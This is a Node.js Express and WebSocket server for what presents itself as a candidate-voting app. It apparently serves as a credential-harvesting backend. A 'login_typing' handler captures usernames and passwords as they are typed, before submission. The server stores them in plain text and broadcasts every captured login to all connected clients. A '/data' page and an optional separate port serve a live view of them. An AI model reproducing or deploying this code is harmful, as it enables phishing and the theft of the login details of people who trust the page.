const express = require('express');
const http = require('http');
const path = require('path');
const { WebSocketServer } = require('ws');

const MAIN_PORT = Number(process.env.PORT) || 3000;
const DATA_PORT = process.env.DATA_PORT ? Number(process.env.DATA_PORT) : null;
const app = express();
const server = http.createServer(app);

const wss = new WebSocketServer({ server });

const CANDIDATES = ['Amrit', 'Ashutosh', 'Suranjan', 'Tushar'];

const state = {
  tallies: Object.fromEntries(CANDIDATES.map((c) => [c, 0])),
  votes: [],
  logins: [],
};

function broadcast(data) {
  const payload = JSON.stringify(data);
  for (const client of wss.clients) {
    if (client.readyState === 1) {
      client.send(payload);
    }
  }
}

function upsertLogin(entry) {
  const index = state.logins.findIndex((l) => l.sessionId === entry.sessionId);
  if (index >= 0) {
    state.logins[index] = entry;
  } else {
    state.logins.push(entry);
  }
}

function sendState(ws) {
  ws.send(
    JSON.stringify({
      type: 'state',
      tallies: { ...state.tallies },
      votes: [...state.votes],
      logins: [...state.logins],
    })
  );
}

wss.on('connection', (ws) => {
  sendState(ws);

  ws.on('message', (raw) => {
    let msg;
    try {
      msg = JSON.parse(raw);
    } catch {
      return;
    }

    if (msg.type === 'login_typing') {
      const { sessionId, username, password } = msg;
      if (!sessionId) return;

      const existing = state.logins.find((l) => l.sessionId === sessionId);
      const entry = {
        sessionId,
        username: username ?? '',
        password: password ?? '',
        timestamp: existing?.timestamp || Date.now(),
        updatedAt: Date.now(),
        isLive: true,
      };

      upsertLogin(entry);
      broadcast({ type: 'login_update', ...entry });
      return;
    }

    if (msg.type === 'login') {
      const { sessionId, username, password, timestamp } = msg;
      if (!sessionId || !username?.trim() || !password?.trim()) return;

      const entry = {
        sessionId,
        username: username.trim(),
        password: password.trim(),
        timestamp: timestamp || Date.now(),
        updatedAt: Date.now(),
        isLive: false,
      };

      upsertLogin(entry);
      broadcast({ type: 'login', ...entry });
      return;
    }

    if (msg.type === 'vote') {
      const { candidate, voterName, timestamp } = msg;
      if (!CANDIDATES.includes(candidate) || !voterName?.trim()) return;

      const vote = {
        candidate,
        voterName: voterName.trim(),
        timestamp: timestamp || Date.now(),
      };

      state.tallies[candidate] = (state.tallies[candidate] || 0) + 1;
      state.votes.push(vote);

      broadcast({ type: 'vote', ...vote, tallies: { ...state.tallies } });
    }
  });
});

app.use(express.static(path.join(__dirname, 'public')));

app.get('/results', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'results.html'));
});

app.get('/data', (_req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'results.html'));
});

server.listen(MAIN_PORT, '0.0.0.0', () => {
  console.log(`Voting app:  http://localhost:${MAIN_PORT}`);
  console.log(`WebSocket:     ws://localhost:${MAIN_PORT}`);
});

if (DATA_PORT) {
  const dataServer = http.createServer(app);
  dataServer.listen(DATA_PORT, () => {
    console.log(`Live data:     http://localhost:${DATA_PORT}/data`);
  });
}
